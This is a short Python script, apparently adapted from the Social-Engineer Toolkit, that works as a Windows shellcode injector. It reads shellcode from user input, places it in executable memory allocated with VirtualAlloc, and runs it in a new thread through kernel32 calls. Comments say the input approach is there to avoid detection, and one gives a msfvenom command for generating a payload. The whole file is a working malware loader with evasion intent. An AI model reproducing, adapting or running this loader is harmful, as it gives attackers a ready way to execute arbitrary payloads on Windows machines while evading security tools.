from ctypes import *

# injects shellcode into memory through Python and ctypes
# based on code from SET (Dave Kennedy (ReL1K))
# https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/payloads/set_payloads/pyinjector_args.py
# to avoid detection grab shellcode from the user, do not hard code it
# $ msfvenom -p windows/exec CMD=calc.exe -f python |grep buf | awk '{ print $3 }' | grep "\\x" | tr -d "\"" | tr -d "\n"

sc = bytearray(input("Paste the shellcode inside single quotes and press enter!\n\n"))

# reserve a region of pages in the virtual address space of the calling process.
ptr = windll.kernel32.VirtualAlloc(c_int(0), c_int(len(sc)), c_int(0x3000), c_int(0x40))

# read in the buffer
buf = (c_char * len(sc)).from_buffer(sc)

# RtlMoveMemory routine copies the contents of a source memory block to a destination memory block (supports overlapping)
windll.kernel32.RtlMoveMemory(c_int(ptr), buf, c_int(len(sc)))

# create a thread to execute within the virtual address space of the calling process
ht = windll.kernel32.CreateThread(c_int(0), c_int(0), c_int(ptr), c_int(0), c_int(0), pointer(c_int(0)))

# wait until the specified object is in the signaled state or the time-out interval elapses
windll.kernel32.WaitForSingleObject(c_int(ht), c_int(-1))

